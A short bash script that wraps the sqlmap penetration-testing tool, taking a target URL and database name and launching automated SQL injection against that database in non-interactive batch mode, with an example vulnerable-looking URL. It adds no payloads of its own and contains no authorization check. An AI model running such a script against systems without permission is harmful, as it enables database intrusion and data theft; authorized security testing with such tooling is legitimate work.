#!/bin/bash
# SQLMap - Automated SQL injection targeting specific database
# Options:
# -u : URL to scan
# -D : Database name
# --batch : Never ask for user input, use the default behavior

# Usage: sqlmap_db.sh <target_url> <database_name>
# Example script
# sqlmap_db.sh http://example.com/vuln.php?id=1 my_database

# Check if sqlmap is installed
if ! command -v sqlmap &> /dev/null
then
    echo "sqlmap could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <database_name>"
    exit 1
fi

TARGET_URL=$1
DATABASE=$2

echo "Starting SQL injection on $TARGET_URL targeting database $DATABASE"

# Perform SQL injection
sqlmap -u $TARGET_URL -D $DATABASE --batch

echo "SQL injection targeting database $DATABASE completed."
